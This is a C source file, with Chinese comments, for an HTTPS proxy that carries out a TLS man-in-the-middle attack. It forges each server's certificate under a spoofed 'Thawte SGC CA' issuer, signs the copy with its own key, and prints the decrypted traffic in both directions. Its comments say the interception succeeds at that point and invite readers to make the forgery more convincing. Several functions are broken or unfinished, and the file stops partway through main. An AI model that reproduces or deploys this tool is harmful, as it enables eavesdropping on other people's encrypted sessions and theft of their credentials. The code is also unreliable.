#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <regex.h>
#include <netdb.h>
#include <fcntl.h>
#include <errno.h>
#include <stdarg.h>
#include <openssl/bio.h>
#include <openssl/x509.h>
#include <openssl/rsa.h>
#include <sys/stat.h>

// 在Linux下编译C代码，通常需要使用gcc编译器。假设您已经安装了gcc，可以使用以下命令来编译上述C代码：

// shell
// gcc -o socks_proxy socks_proxy.c -lssl -lcrypto
// 其中，socks_proxy.c是您的代码文件名，-lssl和-lcrypto参数告诉编译器链接SSL库和加密库。

// 编译成功后，您可以运行以下命令来启动SOCKS代理服务器：

// ./socks_proxy
// 如果一切正常，您应该会在终端上看到一些输出，表明服务器已启动并正在运行。
// 端口
#define SERVER_PORT 8088
// 密码
#define PWD 1234
// 数据大小
#define BUFSIZE 65535
#define SSL_CONNECTION_RESPONSE "HTTP/1.0 200 Connection established"
#define PROXY_AGENT "Proxy-agent: NG001" 
#define	EINTR		4	/* Interrupted function call */

int sum = 1;
struct timeval timeout = {0, 1000000};
void d4(void *data)
{
    printf("%p\n", data);
}
void da(void *ptr)
{
    union
    {
        unsigned int uint_val;
        float float_val;
        char char_val;
    } data;

    data.uint_val = *((unsigned int *)ptr);
    printf("输出内容: %u\n", data.uint_val);
}
void SSL_Warning(char *custom_string)
{
    char error_buffer[256] = {0};

    fprintf(stderr, "%d, %s ", sum, custom_string);
    ERR_error_string(ERR_get_error(), error_buffer);
    fprintf(stderr, "%s\n", error_buffer);
}
void SSL_Error(char *custom_string)
{
    SSL_Warning(custom_string);
    exit(EXIT_FAILURE);
}
void SSL_terminal(SSL *ssl)
{
    SSL_CTX *ctx = SSL_get_SSL_CTX(ssl);
    SSL_shutdown(ssl);
    SSL_free(ssl);
    if (ctx)
        SSL_CTX_free(ctx);
}
// 超时自动断开
void timeclose(int connfd)
{
    /* Set timeout for client-side I/O operations */
    struct timeval timeout;
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    setsockopt(connfd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout, sizeof(timeout));
    setsockopt(connfd, SOL_SOCKET, SO_SNDTIMEO, (const char *)&timeout, sizeof(timeout));
}
void db(const char *file, int line, const char *func, const char *format, ...)
{
    va_list args;
    va_start(args, format);

    // 获取第一个参数的类型信息
    int first_arg_type = va_arg(args, int);

    // 根据第一个参数的类型信息，选择相应的类型转换函数
    union
    {
        char *c;
        short *s;
        int *i;
        long *l;
        float *f;
        double *d;
    } converter;
    switch (first_arg_type)
    {
    case 'c':
        converter.c = va_arg(args, char *);
        printf("[%s:%d:%s] %s = %c\n", file, line, func, format, *converter.c);
        break;
    case 's':
        converter.s = va_arg(args, short *);
        printf("[%s:%d:%s] %s = %d\n", file, line, func, format, *converter.s);
        break;
    case 'i':
        converter.i = va_arg(args, int *);
        printf("[%s:%d:%s] %s = %d\n", file, line, func, format, *converter.i);
        break;
    case 'l':
        converter.l = va_arg(args, long *);
        printf("[%s:%d:%s] %s = %ld\n", file, line, func, format, *converter.l);
        break;
    case 'f':
        converter.f = va_arg(args, float *);
        printf("[%s:%d:%s] %s = %.3f\n", file, line, func, format, *converter.f);
        break;
    case 'd':
        converter.d = va_arg(args, double *);
        printf("[%s:%d:%s] %s = %.6f\n", file, line, func, format, *converter.d);
        break;
    default:
        printf("[%s:%d:%s] Invalid format type\n", file, line, func);
        break;
    }

    va_end(args);
}
void d(char *str)
{
    // db(__FILE__, __LINE__, __func__, "输出内容：%s", str);
    printf("输出信息:%s\n", str);
}
void dd(int *str)
{
    printf("输出信息: %d\n", *str);
}
//打印16进制
void d16(const char *buffer)
{
     int size = sizeof(buffer) / sizeof(char); 
    //  dd(&size);
    size_t len=500;
    if (buffer == NULL || len <= 0)
    {
        return;
    }
    printf("0x%x: [", buffer);
    for (size_t i = 0; i < len; i++)
    {
        printf("%.2X ", (unsigned char)buffer[i]);
        // printf("%s ",(char)buffer[i]);
    }
    printf("]\n");
}
   


// 字符串复制
char *strcp(char *dest, char *src, size_t n)
{
    if (dest == NULL || src == NULL)
    {
        return NULL;
    }
    strcpy(dest, src);
    return dest;
}
//显示证书信息
void ShowCerts(SSL *ssl)
{
    X509 *cert;
    char *line;
    cert = SSL_get_peer_certificate(ssl); /* get the server's certificate */
    if (cert != NULL)
    {
        printf("Server certificates:\n");
        line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
        printf("Subject: %s\n", line);
        // free(line);       /* free the malloc'ed string */
        line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
        printf("Issuer: %s\n", line);
        // free(line);       /* free the malloc'ed string */
        // X509_free(cert); /* free the malloc'ed certificate copy */
    }
    else
        printf("Info: No client certificates configured.\n");
}
void showCert(X509 *cert)
{
    // X509 *cert;
    char *line;
    // cert = SSL_get_peer_certificate(ssl); /* get the server's certificate */
    if (cert != NULL)
    {
        printf("Server certificates:\n");
        line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
        printf("Subject: %s\n", line);
        // free(line);       /* free the malloc'ed string */
        line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
        printf("Issuer: %s\n", line);
        // free(line);       /* free the malloc'ed string */
        // X509_free(cert); /* free the malloc'ed certificate copy */
    }
    else
        printf("Info: No client certificates configured.\n");
}
int transfer(SSL *ssl_to_client, SSL *ssl_to_server)
{
    int socket_to_client = SSL_get_fd(ssl_to_client);
    int socket_to_server = SSL_get_fd(ssl_to_server);
    int ret;
    char buffer[4096] = {0};

    fd_set fd_read;

    printf("%d, waiting for transfer\n", sum);
    while (1)
    {
        int max;

        FD_ZERO(&fd_read);
        FD_SET(socket_to_server, &fd_read);
        FD_SET(socket_to_client, &fd_read);
        max = socket_to_client > socket_to_server ? socket_to_client + 1
                                                  : socket_to_server + 1;

        ret = select(max, &fd_read, NULL, NULL, &timeout);
        if (ret < 0)
        {
            SSL_Warning("Fail to select!");
            break;
        }
        else if (ret == 0)
        {
            continue;
        }
        if (FD_ISSET(socket_to_client, &fd_read))
        {
            memset(buffer, 0, sizeof(buffer));
            ret = SSL_read(ssl_to_client, buffer, sizeof(buffer));
            if (ret > 0)
            {
                if (ret != SSL_write(ssl_to_server, buffer, ret))
                {
                    SSL_Warning("Fail to write to server!");
                    break;
                }
                else
                {
                    printf("%d, client send %d bytes to server\n", sum, ret);
                    printf("%s\n", buffer);
                }
            }
            else
            {
                SSL_Warning("Fail to read from client!");
                break;
            }
        }
        if (FD_ISSET(socket_to_server, &fd_read))
        {
            memset(buffer, 0, sizeof(buffer));
            ret = SSL_read(ssl_to_server, buffer, sizeof(buffer));
            if (ret > 0)
            {
                if (ret != SSL_write(ssl_to_client, buffer, ret))
                {
                    SSL_Warning("Fail to write to client!");
                    break;
                }
                else
                {
                    printf("%d, server send %d bytes to client\n", sum, ret);
                    printf("%s\n", buffer);
                }
            }
            else
            {
                SSL_Warning("Fail to read from server!");
                break;
            }
        }
    }
    return -1;
}

// 转发
char *forward(int connfd, char *ip, int port, char *buffer)
{

    int dest_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (dest_sock == -1)
    {
        perror("socket");
        return NULL;
    }

    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &dest_addr.sin_addr) <= 0)
    {
        perror("inet_pton");
        close(dest_sock);
        close(connfd);
        return NULL;
    }

    if (connect(dest_sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1)
    {
        perror("connect");
        close(dest_sock);
        close(connfd);
        return NULL;
    }

    int flags = fcntl(dest_sock, F_GETFL, 0);
    fcntl(dest_sock, F_SETFL, flags | O_NONBLOCK);

    // Send the HTTP request to the destination server
    if (send(dest_sock, buffer, strlen(buffer), 0) == -1)
    {
        perror("send");
        close(dest_sock);
        close(connfd);
        return NULL;
    }

    char newbuffer[BUFSIZE];

    int total_read = 0;

    // while (total_read < BUFSIZE)
    while (1)
    {

        int len = read(dest_sock, newbuffer, BUFSIZE);

        if (len == -1 && errno == EAGAIN)
        {
            // Ignore EAGAIN error and continue reading until BUFSIZE is reached or other error occurs
            continue;
        }
        else if (len == -1 && errno != EAGAIN)
        {
            perror("read");
            close(dest_sock);
            close(connfd);
            return NULL;
        }
        else if (len == 0)
        {
            printf("Destination server disconnected\n");
            break;
        }
        else
        {
            total_read += len;
            //  d(newbuffer);

            int n = send(connfd, newbuffer, strlen(newbuffer), 0);
        }
    }

    // char *output = (char *)malloc(total_read + 1);
    // if (output == NULL)
    // {
    //     perror("malloc");
    //     close(dest_sock);
    //     return NULL;
    // }
    // memcpy(output, newbuffer, total_read);
    // output[total_read] = '\0';
    close(dest_sock);
    close(connfd);
    return "";
}
/**
 * @brief 通过TCP连接向后端服务器发送数据，并接收响应数据，同时进行SSL解密处理。
 *
 * @param client_fd 客户端连接的文件描述符（已建立SSL连接）
 * @param server_fd 存储建立的服务器连接的文件描述符（未加密）
 * @param ctx SSL上下文指针，用于SSL解密处理。
 * @param buffer 存储接收到的响应数据的缓冲区（最大长度为1024字节）
 * @param bytes 实际接收到的响应数据的字节数，需要减去SSL解密后的额外字节。
 * @param server_addr 存储目标服务器地址信息的结构体指针（用于TCP连接）
 * @param server_len 目标服务器地址信息的结构体长度（用于TCP连接）
 * @param server_addrlen 目标服务器地址信息的结构体长度（用于TCP连接）的变量指针。
 * @param err 处理过程中遇到的错误信息（如果有）。如果成功则为NULL。可以忽略。
 * @return 成功返回0，失败返回-1。如果失败，需要释放已分配
 * 的资源，并关闭文件描述符。
 */
SSL *SSL_to_server_init(int socket)
{
    SSL_CTX *ctx;

    ctx = SSL_CTX_new(SSLv23_client_method());
    if (ctx == NULL)
        SSL_Error("Fail to init ssl ctx!");

    SSL *ssl = SSL_new(ctx);
    if (ssl == NULL)
        SSL_Error("Create ssl error");
    if (SSL_set_fd(ssl, socket) != 1)
        SSL_Error("Set fd error");

    return ssl;
}
int send_and_receive_with_ssl_decrypt(int client_fd, int server_fd, SSL_CTX *ctx, char *buffer, int *bytes, struct sockaddr_in *server_addr, socklen_t server_addrlen, const char **err)
{
    // SSL *ssl_server;
    // BIO *bio_server;
    // int tmp_bytes;
    // char *tmp_buffer;

    // /* Create SSL/TLS structure for server-side communication */
    // ssl_server = SSL_new(ctx);
    // SSL_set_fd(ssl_server, server_fd);
    // if (SSL_accept(ssl_server) <= 0)
    // {
    //     ERR_print_errors_fp(stderr);
    //     *err = "SSL_accept failed";
    //     return -1;
    // }

    // /* Send data from client to server using SSL/TLS connection */
    // tmp_buffer = buffer;
    // while (*bytes > 0)
    // {
    //     tmp_bytes = SSL_write(ssl_server, tmp_buffer, *bytes);
    //     if (tmp_bytes < 0)
    //     {
    //         ERR_print_errors_fp(stderr);
    //         *err = "SSL_write failed";
    //         return -1;
    //     }
    //     tmp_buffer += tmp_bytes;
    //     *bytes -= tmp_bytes;
    // }

    // /* Receive data from server using plain TCP connection */
    // if (SSL_shutdown(ssl_server) <= 0)
    // {
    //     ERR_print_errors_fp(stderr);
    //     *err = "SSL_shutdown failed";
    //     return -1;
    // }
    // SSL_free(ssl_server);
    // bio_server = BIO_new(BIO_f_ssl());
    // BIO_set(bio_server, BIO_s_socket());
    // BIO_set(bio_server, BIO_NOCLOSE);
    // BIO_set(bio_server, server_fd);
    // tmp_buffer = buffer;
    // while ((tmp_bytes = BIO_read(bio_server, tmp_buffer, *bytes)) > 0)
    // {
    //     tmp_buffer += tmp_bytes;
    //     *bytes -= tmp_bytes;
    // }
    // if (tmp_bytes < 0)
    // {
    //     ERR_print_errors_fp(stderr);
    //     *err = "BIO_read failed";
    //     return -1;
    // }

    // return 0;
}
void SSL_init()
{
    // 初始化 OpenSSL
    SSL_library_init();
    // SSL_load_error_strings();

	// OpenSSL_add_all_algorithms();



     SSLeay_add_ssl_algorithms();  
    OpenSSL_add_all_algorithms();  
    SSL_load_error_strings();  
    ERR_load_BIO_strings();  
    //     // SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, NULL);
    //     //  SSL_CTX_set_verify_depth(ctx, 4);
    //     //  if (SSL_CTX_load_verify_locations(ctx, "mycert.pem", NULL) == 0)
    //     //       return 0;
    //     //  SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_TLSv1_1 | SSL_OP_NO_COMPRESSION);
    //     //  ERR_clear_error();

    //     SSL_CTX_set_options(ctx, SSL_OP_NO_TLSv1 | SSL_OP_NO_TLSv1_1);
}
// 显示当前目录
int showDir()
{
    char cwd[1024];
    if (getcwd(cwd, sizeof(cwd)) != NULL)
    {
        printf("Current directory: %s\n", cwd);
    }
    else
    {
        perror("getcwd() error");
        return 1;
    }
    return 0;
}
// 解码转发
/**
 * 1、浏览器将自己支持的加密规则(也就是 CipherSuite )发给服务器

2、服务器端收到请求，然后从客户支持的 CipherSuite 中选出一个应答,并发送给客户端公钥证书和选用的 HASH 算法

3、客户端收到公钥之后,利用自己的信任的根证书对收到的公钥进行验证.若通过,客户端随机生成对称密钥 (Pre-Master secret),通过服务器发给客户端，然后使用公钥对对称密钥进行加密,并计算连接中全部报文信息的 hash ,再利用生成的对称密钥对 hash 值加密,然后把公钥加密的对称密钥及对称密钥加密的 hash 值发送给服务器.

4、服务器利用自己的私钥对利用公钥加密的对称密钥进行解密,得到对称密钥. 再利用对称密钥解密 hash 值,对 hash 值进行验证.在验证成功后，会返回给客户端 Finish 报文。（至此，ssl 连接建立成功）

5、ssl 连接建立完成之后信息的传输加密过程是这样的:

客户端:先用对称密钥加密要传输的信息,再利用 hash 算法得出加了密的信息的 hash 值.再利用公钥对 hash 值进行加密,之后把对称密钥加密了的信息和利用公钥加密后信息的 hash 值,传输给服务器.

服务器: 与客户端基本相同，不过把公钥加密换做私钥加密。
*/


char *forwardSSL(int connfd, char *ip, int port, char *buffer)
{
    d("解码转发");
    int total_bytes = 0;
    SSL *ssl;
    SSL_CTX *ctx;
    // 初始化ssl
    // SSL_init(ctx, ssl, 1);
    showDir();
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    // SSL_CTX *ctx = SSL_CTX_new(SSLv23_server_method());
    // ctx = SSL_CTX_new(SSLv23_server_method());
    ctx = SSL_CTX_new(SSLv23_server_method());
    if (SSL_CTX_set_cipher_list(ctx, "ECDHE-ECDSA-AES256-GCM-SHA384") != 1)
    {
        printf("Error setting cipher list.\n");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
    //     if (SSL_CTX_gen_key_file(ctx, "/root/server.key") != 1)
    // {
    //     printf("Error generating RSA key pair.\n");
    //     ERR_print_errors_fp(stderr);
    //     exit(EXIT_FAILURE);
    // }

    const char *cert_file = "certificate.crt";
    const char *key_file = "private.key";
    if (SSL_CTX_use_certificate_file(ctx, cert_file, SSL_FILETYPE_PEM) <= 0)
    {
        fprintf(stderr, "Error loading certificate file\n");
        exit(EXIT_FAILURE);
    }
    if (SSL_CTX_use_PrivateKey_file(ctx, key_file, SSL_FILETYPE_PEM) <= 0)
    {
        fprintf(stderr, "Error loading private key file\n");
        exit(EXIT_FAILURE);
    }

    //    SSL_CTX_set_ecdh(ctx, SSL_CTX_get_ecdh(ctx));
    SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_COMPRESSION);
    if ((ssl = SSL_new(ctx)) == NULL)
    {
        perror("SSL_new");
        exit(EXIT_FAILURE);
    }

    SSL_set_fd(ssl, connfd);
    // 建立客户端ssl
    ShowCerts(ssl);
    d("4444");
    if (SSL_accept(ssl) == -1)
    {
        ERR_get_error();
        fprintf(stderr, "SSL链接失败\n");
        ERR_print_errors_fp(stderr);
        return "";
        // exit(EXIT_FAILURE);
    }
    d("4354534");
    // d(SSL_get_error(ssl,ssl_accept_ret ));

    // 读取客户端流信息
    total_bytes = SSL_read(ssl, buffer, BUFSIZE);
    if (total_bytes < 0)
    {
        fprintf(stderr, "SSL_read failed\n");
        ERR_print_errors_fp(stderr);
    }
    else if (total_bytes == 0)
    {
        printf("Client disconnected\n");
    }
    else
    {
        d("这里建立客户端链接以及打印客户端信息");
        d(buffer);
        // Process the received data
        // ...
    }
    int sockfd = connfd;
    connfd = socket(AF_INET, SOCK_STREAM, 0);
    if (connfd < 0)
    {
        perror("socket");
        exit(1);
    }

    d("6666");
    // 设置套接字选项，启用SSL连接
    
    return "";
}

// ssl链接远程
int SSLconnectRemote(char *ip, int port)
{
    // 连接服务器
    int dest_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (dest_sock == -1)
    {
        perror("socket");
        return 0;
    }
    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &dest_addr.sin_addr) <= 0)
    {
        perror("inet_pton");
        close(dest_sock);
        return 0;
    }
    if (connect(dest_sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1)
    {
        perror("connect");
        close(dest_sock);
        return 0;
    }
    // 从服务器获取公钥并验证
    return dest_sock;
}
SSL *SSL_to_client_init(int socket, X509 *cert, EVP_PKEY *key)
{

// char *b;
// size_t k;
// safe_read(socket,b, k);

    SSL_CTX *ctx2;
    //  const SSL_METHOD* method = TLSv1_2_server_method();
    //  const SSL_METHOD* method = SSLv23_server_method();
     const SSL_METHOD* method = SSLv23_method();
    ctx2 = SSL_CTX_new(method);
    // ctx = SSL_CTX_new(TLS_server_method());
   if (!ctx2) {  
        d("SSL_CTX_new failed\n");  
        exit(1);  
    }  
     SSL_CTX_set_verify(ctx2, SSL_VERIFY_NONE, NULL);  
    SSL_CTX_set_options(ctx2, SSL_OP_NO_SSLv2| SSL_OP_NO_SSLv3); // 禁用SSLv2和SSLv3，使用更安全的TLS协议  
  
    SSL_CTX_set_ecdh_auto(ctx2, 1); // 自动选择合适的椭圆曲线（EC）进行加密  
    //公钥，私钥检测
// if(X509_check_private_key(cert, key) != 1)
// fprintf(stderr, " CA cert does not match key.\n");
// d("证书公钥，撕咬匹配正常");
    if (ctx2 == NULL)
    {
        SSL_Error("Fail to init ssl ctx!");
    }
    // showCert(cert);
    if (cert && key)
    {        
        // if (SSL_CTX_use_certificate(ctx2, cert) != 1)
        //     d("Certificate error");
        // if (SSL_CTX_use_PrivateKey(ctx2, key) != 1)
        //     d("key error");
        // if (SSL_CTX_check_private_key(ctx2) != 1)
        //     d("Private key does not match the certificate public key");

  // 加载CA的证书  ---缺少这个
    if(!SSL_CTX_load_verify_locations(ctx2, "ca.crt", NULL)){
        printf("SSL_CTX_load_verify_locations error!\n");
        ERR_print_errors_fp(stderr);
        exit(0);
    }

// if (SSL_CTX_use_certificate_file(ctx2, "h1.crt", SSL_FILETYPE_PEM) != 1) {
//     fprintf(stderr, "Failed to use root certificate: %s", ERR_reason_error_string(ERR_get_error()));
//     exit(1);
// }
 if (SSL_CTX_use_certificate(ctx2, cert) != 1)
            d("Certificate error");
if (SSL_CTX_use_PrivateKey_file(ctx2, "ca.key", SSL_FILETYPE_PEM) != 1) {
    fprintf(stderr, "Failed to use client key: %s", ERR_reason_error_string(ERR_get_error()));
    exit(1);
}
if (SSL_CTX_check_private_key(ctx2) != 1) {
    fprintf(stderr, "Failed to check client key: %s", ERR_reason_error_string(ERR_get_error()));
    exit(1);
}




    }
    SSL *ssl2 = SSL_new(ctx2);
    ShowCerts(ssl2);
    if (ssl2 == NULL)
        SSL_Error("Create ssl error");
    if (SSL_set_fd(ssl2, socket) != 1)
        SSL_Error("Set fd error");
d("fgdfgdfg");
// if (ret != SSL_OK) {
//     fprintf(stderr, "Failed to set SSL fd: %s", SSL_get_error(ssl, ret));
//     exit(1);
// }
 // 接收客户端的握手请求，并验证客户端提供的证书  
    unsigned char buf[1024];  
    int n = SSL_read(ssl2, buf, sizeof(buf));  
    if (n <= 0) {  
        fprintf(stderr, "SSL_read failed\n");  
        exit(1);  
    } 
    // int n=0; 
    // 处理握手请求数据，验证客户端证书等操作，此处省略...  
  
    // 发送握手响应给客户端  
    const char* response = "server hello";  
    n = SSL_write(ssl2, response, strlen(response));  
    if (n <= 0) {  
        fprintf(stderr, "SSL_write failed\n");  
        exit(1);  
    }  
  
    // 接收客户端的结束握手请求，验证客户端提供的共享密钥和其他必要信息  
    n = SSL_read(ssl2, buf, sizeof(buf));  
    if (n <= 0) {  
        fprintf(stderr, "SSL_read failed\n");  
        exit(1);  
    }  
    // 验证共享密钥和其他信息，此处省略...  
  
    // 发送结束握手响应给客户端，表示握手成功  
    const char* response2 = "finish handshake";  
    n = SSL_write(ssl2, response2, strlen(response2));  
    if (n <= 0) {  
        fprintf(stderr, "SSL_write failed\n");  
        exit(1);  
    }  

    return ssl2;
}
// 伪造假证书
X509 *create_fake_certificate(SSL *ssl_to_server, EVP_PKEY *key)
{
    unsigned char buffer[128] = {0};
    int length = 0, loc;
    
// 从服务器获取证书并复制一个副本
    X509 *server_x509 = SSL_get_peer_certificate(ssl_to_server);
    X509 *fake_x509 = X509_dup(server_x509);
    if (server_x509 == NULL)
        SSL_Error("Fail to get the certificate from server!");
    //    X509_print_fp(stderr, server_x509);

    X509_set_version(fake_x509, X509_get_version(server_x509));
    ASN1_INTEGER *a = X509_get_serialNumber(fake_x509);
    a->data[0] = a->data[0] + 1;
    //    ASN1_INTEGER_set(X509_get_serialNumber(fake_x509), 4);
    X509_NAME *issuer = X509_NAME_new();
    //    length = X509_NAME_get_text_by_NID(issuer, NID_organizationalUnitName,
    //            buffer, 128);
    //    buffer[length] = ' ';
    //    loc = X509_NAME_get_index_by_NID(issuer, NID_organizationalUnitName, -1);
    //    X509_NAME_delete_entry(issuer, loc);
    
// 证书修改的代码详见代码，这里展示的只是随意填写的几个字段，读者可以修改这部分代码使得伪造的证书更加逼真
    X509_NAME_add_entry_by_txt(issuer, "CN", MBSTRING_ASC,
                               "Thawte SGC CA", -1, -1, 0);
    X509_NAME_add_entry_by_txt(issuer, "O", MBSTRING_ASC, "Thawte Consulting (Pty) Ltd.", -1, -1, 0);
    X509_NAME_add_entry_by_txt(issuer, "OU", MBSTRING_ASC, "Thawte SGC CA", -1,
                               -1, 0);
    X509_set_issuer_name(fake_x509, issuer);
    //    X509_set_notBefore(fake_x509, X509_get_notBefore(server_x509));
    //    X509_set_notAfter(fake_x509, X509_get_notAfter(server_x509));
    //    X509_set_subject_name(fake_x509, X509_get_subject_name(server_x509));
    
// 重新设置副本的密钥为我们自己的密钥，并使用该密钥签名
    X509_set_pubkey(fake_x509, key);
    //    X509_add_ext(fake_x509, X509_get_ext(server_x509, -1), -1);
    X509_sign(fake_x509, key, EVP_sha1());

    //    X509_print_fp(stderr, fake_x509);

    return fake_x509;
}
// 生成1024位的RSA私钥并保存到private.key文件：

// bash
// openssl genrsa -out private.key 1024
// 这条命令将生成一个1024位的RSA私钥，并将其保存在名为private.key的文件中。

// 从private.key文件生成对应的公钥并保存到public.key文件：

// bash
// openssl rsa -in private.key -pubout -out public.key
EVP_PKEY *create_key()
{
    EVP_PKEY *key = EVP_PKEY_new();
    RSA *rsa = RSA_new();

    FILE *fp;
    if ((fp = fopen("ca.key", "r")) == NULL)
        d("private.key");
    PEM_read_RSAPrivateKey(fp, &rsa, NULL, NULL);
    if ((fp = fopen("ca.crt", "r")) == NULL)
        d("public.key");
    PEM_read_RSAPublicKey(fp, &rsa, NULL, NULL);
    EVP_PKEY_assign_RSA(key, rsa);
    return key;
}
// 直接转发
char *forwardSslNoDecode(int socket_to_client, char *ip, int port, char *buffer)
{
    d(buffer);
    d("直接转发");
    // char **clienthello;
    // char **sn;
    // ssl_tls_clienthello_parse(buffer,sizeof(buffer),0,&clienthello,&sn);
    // 从文件读取伪造SSL证书时需要的RAS私钥和公钥
    EVP_PKEY *key = create_key();
    X509 *fake_x509;
    SSL *ssl_to_client, *ssl_to_server;
    int socket_to_server = SSLconnectRemote(ip, port);
    ssl_to_server = SSL_to_server_init(socket_to_server);
    if (SSL_connect(ssl_to_server) < 0)
        SSL_Error("Fail to connect server with ssl!");
    printf("%d, 建立服务端TSL链接成功\n", sum);
    // 从服务器获得证书，并通过这个证书伪造一个假的证书
    fake_x509 = create_fake_certificate(ssl_to_server, key);
    d("真证书");
    ShowCerts(ssl_to_server);
    d("伪证书");
    showCert(fake_x509);
    //  da(fake_x509);
    //先发送信息"HTTP/1.1 200 Connection established"
    // 使用假的证书和我们自己的密钥，和客户端建立一个SSL连接。至此，SSL中间人攻击成功
    ssl_to_client = SSL_to_client_init(socket_to_client, fake_x509, key);
    if (SSL_accept(ssl_to_client) <= 0)
        SSL_Error("Fail to accept client with ssl!");
    printf("%d, SSL to client\n", sum);
    if (transfer(ssl_to_client, ssl_to_server) < 0)
    {
        printf("%d, connection shutdown\n", sum);
        SSL_terminal(ssl_to_client);
        SSL_terminal(ssl_to_server);
        shutdown(socket_to_server, SHUT_RDWR);
        shutdown(socket_to_client, SHUT_RDWR);
        X509_free(fake_x509);
    }
}

void remove_spaces(char *str)
{
    int i, j;
    for (i = 0, j = 0; str[i]; i++)
    {
        if (!isspace((unsigned char)str[i]))
        {
            str[j] = str[i];
            j++;
        }
    }
    str[j] = '\0'; // 添加字符串结束符
}
// 字符串分割
char **split_string(char *str, char *delim)
{
    remove_spaces(str);
    char **tokens = NULL;
    char *domain;
    char *port;
    tokens = (char **)malloc((2) * sizeof(char *));
    domain = strtok(str, ":");
    port = strtok(NULL, ":");
    tokens[0] = domain;
    tokens[1] = port == NULL ? "80" : port;
    return tokens;
}

// 字符串裁剪
char *cutstr(char *str, int s, int e)
{
    // char str[100] = "Hello, World!";
    char *substr;
    int start_pos = s;  // 开始截取的位置
    int length = e - s; // 截取的长度
    // 从指定位置开始，截取指定长度的子串
    substr = (char *)malloc(length + 1); // +1 for null terminator
    if (substr == NULL)
    {
        printf("Memory allocation failed\n");
        return NULL;
    }
    strncpy(substr, str + start_pos, length);
    substr[length] = '\0'; // 添加字符串结束符
    return substr;
}

// 提取域名端口信息
char *extract_host(char *buffer, size_t buffer_size)
{
   
    regex_t regex;
    int ret;
    char msgbuf[1024];
    char *host;
    const char *pattern = "host:(.+)";
    // ret = regcomp(&regex, "host:(.+)");
    ret = regcomp(&regex, pattern, REG_EXTENDED | REG_NEWLINE | REG_ICASE);

    if (ret != 0)
    {
        printf("Failed to compile regex\n");
        return NULL;
    }

    ret = regexec(&regex, buffer, 0, NULL, 0);
    if (!ret)
    {
        regmatch_t match;
        regoff_t start = 0, end = 0;
        match.rm_so = 0;
        match.rm_eo = strlen(buffer);
        if (regexec(&regex, buffer, 1, &match, 0) == 0)
        {
            start = match.rm_so;
            end = match.rm_eo;
            // printf("Match: %.*s\n", (int)(end - start), buffer + start);
            host = cutstr(buffer, start + 5, end);

            // host = cutstr(host, 5, sizeof(host)-5);
            return host; // return the host line
        }
    }
    else if (ret == REG_NOMATCH)
    {
        printf("匹配失败\n");
    }
    else
    {
        regerror(ret, &regex, msgbuf, sizeof(msgbuf));
        fprintf(stderr, "Regex match failed: %s\n", msgbuf);
        return "";
    }

    // 释放正则表达式资源
    regfree(&regex);

    return "";
}
// 域名转ip
char *domain_to_ip(const char *domain)
{
    struct hostent *host;
    struct in_addr **addr_list;

    if ((host = gethostbyname(domain)) == NULL)
    {
        // strcpy(ip, "Unknown");
        return "";
    }
    // 遍历IP地址列表并打印
    addr_list = (struct in_addr **)host->h_addr_list;
    for (int i = 0; addr_list[i] != NULL; i++)
    {
        // printf("IP address: %s\n", inet_ntoa(*addr_list[i]));
        // strcpy(ip, );
        return inet_ntoa(*addr_list[i]);
        break;
    }
    return "";
}


int main(int argc, char *argv[])
{
    int listenfd, connfd;
    struct sockaddr_in servaddr, cliaddr;
    char sendbuf[BUFSIZE], recvbuf[BUFSIZE];
    int port = SERVER_PORT;
    SSL_init();
    // 创建epoll实例
    struct epoll_event ev, events[100];
    int epfd = epoll_create(1);
    if (epfd < 0)
    {
        perror("epoll_create");
        exit(1);
    }
    // 创建套接字
    listenfd = socket(AF_INET, SOCK_STREAM, 0);
    if (listenfd < 0)
    {
        perror("socket");
        exit(1);
    }

    // 设置地址重用
    int reuse = 1;
    setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));

    // 绑定端口号和IP地址
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    servaddr.sin_port = htons(port);
    if (bind(listenfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
    {
        perror("bind");
        exit(1);
    }

    // 监听端口号
    if (listen(listenfd, 10) < 0)
    {
        perror("listen");
        exit(1);
    }

    printf("Listening on port %d...\n", port);

    while (1)
    {
        // 注册套接字到epoll实例
        ev.events = EPOLLIN | EPOLLET;
        ev.data.fd = listenfd;
        epoll_ctl(epfd, EPOLL_CTL_ADD, listenfd, &ev);

        // 等待事件发生
        int num_events = epoll_wait(epfd, events, 10, -1);
        if (num_events < 0)
        {
            perror("epoll_wait");
            exit(1);
        }

        // 处理客户端连接请求
        for (int i = 0; i < num_events; i++)
        {
            if (events[i].data.fd == listenfd)
            {
                socklen_t client_addrlen = sizeof(cliaddr);
                connfd = accept(listenfd, (struct sockaddr *)&cliaddr, &client_addrlen);
                if (connfd < 0)
                {
                    perror("accept");
                    exit(1);
                }
                // chpwd(connfd);
                printf("客户端信息 from %s:%d\n", inet_ntoa(cliaddr.sin_addr), ntohs(cliaddr.sin_port));
